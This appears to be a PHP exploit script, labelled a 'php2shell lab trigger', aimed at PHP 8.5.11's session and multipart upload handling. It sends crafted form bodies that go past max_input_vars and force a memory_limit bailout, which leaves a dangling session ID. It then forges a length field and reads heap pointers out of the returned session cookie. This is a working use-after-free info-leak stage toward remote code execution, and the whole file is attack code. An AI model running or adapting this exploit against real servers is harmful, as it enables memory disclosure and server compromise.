<?php
declare(strict_types=1);

/*
 * Legacy php2shell lab trigger (PHP 8.5.11, display_errors=On variant).
 *
 * A: >max_input_vars warning is written to the response, which sets
 *    SG(headers_sent)=1. The session cookie send then fails, send_cookie stays
 *    1, php_session_initialize() aborts and closes the *valid* ps_files, so
 *    PS(mod_data) becomes NULL. A trailing huge field then hits memory_limit;
 *    the bailout leaves a dangling PS(id) with send_cookie=1.
 *
 * B: no file part, so the END cleanup initializes the session with
 *    mod_data == NULL (no stale ps_files close) and sends the cookie from the
 *    stale PS(id), which the field buffers can reclaim.
 */

const BND = 'BBBBBBBBBB';
const PORT = 8088;

function send_plain(int $port, string $path, string $body, float $timeout = 60.0): string {
    $s = @stream_socket_client('tcp://127.0.0.1:' . $port, $errno, $errstr, 5.0);
    if (!$s) {
        throw new RuntimeException("connect: $errstr ($errno)");
    }
    stream_set_timeout($s, (int) $timeout);
    $h = "POST $path HTTP/1.1\r\nHost: 127.0.0.1:$port\r\n"
       . 'Content-Type: multipart/form-data; boundary=' . BND . "\r\n"
       . 'Content-Length: ' . strlen($body) . "\r\nConnection: close\r\n\r\n";
    fwrite($s, $h);
    for ($o = 0; $o < strlen($body); $o += 262144) {
        fwrite($s, substr($body, $o, 262144));
    }
    $out = '';
    while (!feof($s)) {
        $r = fread($s, 65536);
        if ($r === false || $r === '') {
            break;
        }
        $out .= $r;
    }
    fclose($s);
    return $out;
}

function part(string $name, string $value = '', ?string $filename = null, ?string $ctype = null): string {
    $s = '--' . BND . "\r\nContent-Disposition: form-data; name=\"$name\"";
    if ($filename !== null) {
        $s .= "; filename=\"$filename\"";
    }
    $s .= "\r\n";
    if ($ctype !== null) {
        $s .= "Content-Type: $ctype\r\n";
    }
    return $s . "\r\n" . $value . "\r\n";
}

function build_a(int $nvars, int $hugeMb): string {
    $out = '';
    for ($i = 0; $i < $nvars; $i++) {
        $out .= part(sprintf('p%04d', $i), 'x');
    }
    $out .= part('PHPSESSID', "\0");
    $out .= part('PHP_SESSION_UPLOAD_PROGRESS', 'pwn');
    $out .= part('f', str_repeat('A', 64), 'a.txt', 'application/octet-stream');
    $out .= part('big', str_repeat('B', $hugeMb * 1024 * 1024));
    return $out . '--' . BND . "--\r\n";
}

function build_b(int $n, bool $forge, int $leakLen, int $xcount = 0): string {
    $out = part('PHPSESSID', 'attacksessionid0001');
    $out .= part('PHP_SESSION_UPLOAD_PROGRESS', 'pwn');
    for ($i = 0; $i < $n; $i++) {
        $val = substr(sprintf('v%04d', $i) . str_repeat('x', 44), 0, 48);
        $out .= part((string) (1000 + $i), $val);
    }
    if ($forge) {
        $v = str_repeat('A', 79);
        $v = substr_replace($v, pack('P', $leakLen), 0x10, 8);
        $v = substr_replace($v, 'L', 0x18, 1);
        $out .= part('1999', $v);
    }
    for ($i = 0; $i < $xcount; $i++) {
        $out .= part(sprintf('x%05d', $i) . str_repeat('[a]', 12), 'v');
    }
    return $out . '--' . BND . "--\r\n";
}

function setcookie_value(string $resp): string {
    $head = explode("\r\n\r\n", $resp, 2)[0];
    foreach (explode("\r\n", $head) as $line) {
        if (stripos($line, 'set-cookie:') === 0) {
            if (preg_match('/PHPSESSID=([^;]*)/', $line, $m)) {
                return rawurldecode($m[1]);
            }
        }
    }
    return '';
}

function main(): int {
    global $argv;
    $mode = $argv[1] ?? 'a';
    $port = (int) ($argv[2] ?? PORT);
    if ($mode === 'a') {
        $nv = (int) ($argv[3] ?? 1005);
        $mb = (int) ($argv[4] ?? 12);
        $body = build_a($nv, $mb);
        $resp = send_plain($port, '/index.php', $body);
        fwrite(STDERR, 'A body=' . strlen($body) . ' resp=' . strlen($resp) . "\n");
        $head = explode("\r\n\r\n", $resp, 2);
        fwrite(STDERR, substr($head[0] ?? '', 0, 200) . "\n");
        fwrite(STDERR, substr($head[1] ?? '', 0, 500));
        return 0;
    }
    if ($mode === 'b') {
        $n = (int) ($argv[3] ?? 892);
        $forge = (int) ($argv[4] ?? 0) !== 0;
        $leak = intval($argv[5] ?? '0x1000', 0);
        $xcount = (int) ($argv[6] ?? 0);
        $body = build_b($n, $forge, $leak, $xcount);
        $resp = send_plain($port, '/index.php', $body, 120.0);
        fwrite(STDERR, 'B body=' . strlen($body) . ' resp=' . strlen($resp) . "\n");
        $cookie = setcookie_value($resp);
        fwrite(STDERR, 'B body=' . strlen($body) . ' resp=' . strlen($resp) . "\n");
        fwrite(STDERR, 'cookie len=' . strlen($cookie) . ' head=' . bin2hex(substr($cookie, 0, 24)) . "\n");
        fwrite(STDERR, 'value=' . substr($cookie, 0, 80) . "\n");
        file_put_contents('/tmp/p2s-b.resp', $resp);
        $ptrLo = 0x7f0000000000;
        $ptrHi = 0x800000000000;
        $counts = [];
        $buckets = [];
        $n = strlen($cookie);
        for ($o = 0; $o + 8 <= $n; $o += 8) {
            $v = unpack('P', substr($cookie, $o, 8))[1];
            if ($v >= $ptrLo && $v < $ptrHi) {
                $k = sprintf('%016x', $v);
                $counts[$k] = ($counts[$k] ?? 0) + 1;
                $b = sprintf('%016x', $v & ~0x1FFFFF);
                $buckets[$b] = ($buckets[$b] ?? 0) + 1;
            }
        }
        arsort($counts);
        arsort($buckets);
        fwrite(STDERR, 'ptr total=' . array_sum($counts) . "\n");
        foreach (array_slice($buckets, 0, 8, true) as $b => $c) {
            fwrite(STDERR, "  cluster $b x$c\n");
        }
        foreach (array_slice($counts, 0, 8, true) as $q => $c) {
            fwrite(STDERR, "  qword   $q x$c\n");
        }
        return 0;
    }
    fwrite(STDERR, "usage: php legacy.php a PORT [NVARS] [HUGE_MB]\n       php legacy.php b PORT [N] [FORGE] [LEAK_LEN]\n");
    return 2;
}

exit(main());
